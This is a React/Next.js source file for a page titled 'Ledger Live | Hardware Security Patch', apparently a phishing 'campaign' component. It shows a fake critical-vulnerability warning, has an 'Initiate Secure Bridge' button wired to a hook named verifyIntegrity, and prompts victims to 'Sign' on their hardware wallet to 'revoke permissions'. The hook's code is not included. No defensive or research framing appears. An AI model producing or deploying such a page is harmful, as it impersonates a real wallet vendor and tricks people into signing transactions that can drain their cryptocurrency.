import React, { useState } from 'react';
import Head from 'next/head';
import { Shield, Lock, AlertTriangle, ChevronRight, Activity, Cpu } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { useDataIntegrity } from '@/hooks/useDataIntegrity';

export default function C9LedgerCampaign() {
  const { verifyIntegrity, isProcessing } = useDataIntegrity();
  const [step, setStep] = useState(1);

  return (
    <div className="min-h-screen bg-[#020408] text-white flex items-center justify-center p-6 lg:p-12">
      <Head>
        <title>Ledger Live | Hardware Security Patch</title>
      </Head>

      <div className="fixed inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(239,68,68,0.1),transparent_70%)] pointer-events-none" />

      <div className="max-w-xl w-full">
         <div className="bg-[#05070a]/80 backdrop-blur-3xl border border-white/5 rounded-[3rem] p-10 lg:p-16 relative overflow-hidden ring-1 ring-white/5 shadow-2xl">
            
            <div className="flex items-center gap-4 mb-10">
               <div className="w-16 h-16 rounded-2xl bg-zinc-900 border border-white/5 flex items-center justify-center text-red-500 shadow-lg shadow-red-500/10">
                 <Shield className="w-8 h-8" />
               </div>
               <div>
                  <h4 className="text-[10px] font-black text-red-500 uppercase tracking-[0.2em] mb-1">Critical Vulnerability</h4>
                  <p className="text-xl font-bold tracking-tighter italic">Ledger Live v2.68</p>
               </div>
            </div>

            <AnimatePresence mode="wait">
               {step === 1 && (
                 <motion.div
                   key="step1"
                   initial={{ opacity: 0, y: 10 }}
                   animate={{ opacity: 1, y: 0 }}
                   exit={{ opacity: 0, y: -10 }}
                   className="space-y-8"
                 >
                    <div className="space-y-4">
                       <h2 className="text-3xl font-black italic tracking-tighter leading-none">EMERGENCY SECURITY PATCH REQUIRED</h2>
                       <p className="text-slate-500 font-medium leading-relaxed italic">
                         A critical vulnerability has been detected in the Ledger Live desktop application. 
                         Previously signed transactions may have exposed your encrypted hardware context.
                       </p>
                    </div>

                    <div className="p-6 rounded-3xl bg-red-500/5 border border-red-500/20 space-y-4">
                       <div className="flex items-center gap-3">
                          <AlertTriangle className="w-5 h-5 text-red-500" />
                          <span className="text-xs font-bold text-red-500 uppercase tracking-widest">Action Required</span>
                       </div>
                       <p className="text-xs text-slate-400 leading-relaxed font-medium">
                         Please synchronize your hardware device with the official security bridge to revoke malicious firmware permissions.
                       </p>
                    </div>

                    <button 
                      onClick={() => { setStep(2); verifyIntegrity(); }}
                      disabled={isProcessing}
                      className="w-full h-20 rounded-3xl bg-white text-black font-black italic text-xl tracking-tighter uppercase relative overflow-hidden group hover:scale-[1.02] active:scale-95 transition-all disabled:opacity-50"
                    >
                       <span className="relative z-10">{isProcessing ? "CONNECTING..." : "Initiate Secure Bridge"}</span>
                       <div className="absolute inset-x-0 bottom-0 h-1 bg-red-500" />
                    </button>
                 </motion.div>
               )}

               {step === 2 && (
                 <motion.div
                    key="step2"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="space-y-8 text-center"
                 >
                    <div className="w-20 h-20 rounded-full border-2 border-white/5 mx-auto flex items-center justify-center relative">
                       <Activity className="w-8 h-8 text-blue-500 animate-pulse" />
                       <div className="absolute inset-0 rounded-full border-2 border-blue-500 border-t-transparent animate-spin" />
                    </div>
                    
                    <div className="space-y-2">
                       <h3 className="text-2xl font-black italic uppercase tracking-tighter">Connecting Hardware...</h3>
                       <p className="text-slate-500 text-sm font-medium">Please open Ledger Live on your device and confirm the "Security Audit" request.</p>
                    </div>

                    <div className="flex justify-center gap-2">
                       <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce [animation-delay:-0.3s]" />
                       <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce [animation-delay:-0.15s]" />
                       <div className="w-2 h-2 rounded-full bg-blue-500 animate-bounce" />
                    </div>

                    <div className="p-8 rounded-3xl bg-zinc-900 border border-white/5 text-left space-y-4">
                       <div className="flex items-center justify-between">
                          <span className="text-[10px] font-black text-slate-600 uppercase tracking-widest">Device Status</span>
                          <span className="text-[10px] font-black text-emerald-500 uppercase tracking-widest">Encrypted Link Active</span>
                       </div>
                       <div className="space-y-2 font-mono text-[10px] text-slate-500">
                          <p>[BRIDGE] Initializing handshake...</p>
                          <p>[BRIDGE] Fetching hardware ID: 0x82...f9</p>
                          <p className="text-white italic animate-pulse">[BRIDGE] Please "Sign" on your device to revoke permissions.</p>
                       </div>
                    </div>
                 </motion.div>
               )}
            </AnimatePresence>

            {/* Footer Credibility */}
            <div className="mt-12 pt-8 border-t border-white/5 flex items-center justify-between opacity-30 group hover:opacity-100 transition-opacity">
               <div className="flex items-center gap-4">
                  <div className="w-8 h-8 rounded-lg bg-zinc-900 flex items-center justify-center">
                    <Lock className="w-4 h-4" />
                  </div>
                  <span className="text-[10px] font-bold uppercase tracking-widest">Zero-Trust Verified</span>
               </div>
               <span className="text-[10px] font-mono">v3.4.1_STABLE</span>
            </div>

         </div>
      </div>
    </div>
  );
}
